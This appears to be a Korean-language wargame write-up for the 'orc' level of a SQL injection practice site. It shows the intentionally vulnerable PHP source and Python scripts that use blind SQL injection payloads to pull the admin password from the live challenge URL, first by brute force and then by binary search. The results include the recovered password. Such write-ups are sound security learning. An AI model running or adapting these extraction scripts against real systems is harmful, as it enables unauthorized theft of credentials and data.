## Blind SQL Injection

SQL True or False를 이용해 pw값 유추

```php
length() = 8
ascii(substr()) <= num
```

이분 탐색을 통해 무차별 대입의 속도 향상!!

## ORC 문제 풀이

```sql
query : select id from prob_orc where id='admin' and pw=''
```

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

### 풀이

```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc");
```

- 이 부분에서 실제 pw를 비교하기 때문에 일반적인 sql 인젝션으로는 접근 ❌
- Blind sql을 이용해 실제 pw를 알아내야함!
- pw 길이를 알아내기 위해 python code 작성!!

```python
import requests

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookies = {"PHPSESSID": "MYCOOKIE"}

for i in range(100):
    payload = f"?pw=' or id='admin' and length(pw)={i};%23"
    res = requests.get(url + payload, cookies=cookies)
    print(res.text)
    if "Hello admin" in res.text:
        print("[+] length :", i)
        break
```

- [+] length : 8

- pw 길이를 알았으니 pw를 알아내야함!

```python
substr("abc", 1, 1) = 'a'
```

```python
substring("abc", 1, 1) = 'a'
```

```python
mid("abc", 1, 1) = 'a'
```

```python
left("abc", 1, 1) = 'a'
```

```python
right("abc", 1, 1) = 'a'
```

```python
right(left("abc", 1, 1), 1) = 'a'  
```

- 각 필터링에 맞추어 상황에 따라 적절히 사용함

### Brute force

```python
import requests

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookies = {"PHPSESSID": "MYCOOKIE"}
len = 0
pw = ''

for i in range(100):
    payload = f"?pw=' or id='admin' and length(pw)={i};%23"
    res = requests.get(url + payload, cookies=cookies)
    if "Hello admin" in res.text:
        print("[+] length :", i)
        len = i
        break

# 추가된 부분
for i in range(1, len + 1):
    for j in range(32, 127):
        payload = f"?pw=' or id='admin' and ord(substr(pw, {i}, 1))={j};%23"
        res = requests.get(url + payload, cookies=cookies)
        if "Hello admin" in res.text:
            print(f"[+] {i} : {chr(j)}")
            pw += chr(j)
            break

print(f"[+] pw : {pw}")
```

- 결과

[+] length : 8
[+] 1 : 0
[+] 2 : 9
[+] 3 : 5
[+] 4 : a
[+] 5 : 9
[+] 6 : 8
[+] 7 : 5
[+] 8 : 2
[+] pw : 095a9852

- url에 pw=095a9852 대입

### Binary search(속도 개선)

```python
import requests

url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookies = {"PHPSESSID": "MYCOOKIE"}
len = 0
pw = ''

for i in range(100):
    payload = f"?pw=' or id='admin' and length(pw)={i};%23"
    res = requests.get(url + payload, cookies=cookies)
    if "Hello admin" in res.text:
        print("[+] length :", i)
        len = i
        break

def is_pw(index, num):
    payload = f"?pw=' or id='admin' and ord(substr(pw, {index}, 1))={num};%23"
    res = requests.get(url + payload, cookies=cookies)
    if "Hello admin" in res.text:
        return False
    else:
        return True

def binary_search(index):
    start = 32
    end = 126
    mid = (start + end) // 2
    while(is_pw(index, mid)):
        payload = f"?pw=' or id='admin' and ord(substr(pw, {index}, 1))<={mid};%23"
        res = requests.get(url + payload, cookies=cookies)
        if "Hello admin" in res.text:
            end = mid - 1
        else:
            start = mid + 1
        mid = (start + end) // 2
    
    print(f"[+] {index} : {chr(mid)}")

    return chr(mid)

for i in range(1, len + 1):
    pw += binary_search(i)

print(f"[+] pw : {pw}")
```
